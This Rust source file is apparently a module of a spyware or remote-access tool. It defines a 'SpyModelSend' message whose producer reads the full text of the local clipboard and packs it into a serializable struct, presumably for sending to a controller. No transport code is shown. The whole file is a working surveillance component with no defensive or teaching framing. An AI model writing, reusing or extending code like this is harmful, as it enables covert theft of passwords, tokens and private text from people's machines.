use serde::{Serialize, Deserialize};
use common::registry::{Producer, Context};
use arboard::Clipboard;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModelSend {
    _t:  &'static str,
    clipboard: String
}

impl Producer for SpyModelSend {
    fn produce(_krousinator_instance_data: &Context) -> Self {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Self { _t: "SpyModelSend", clipboard: text}
        
    }
}

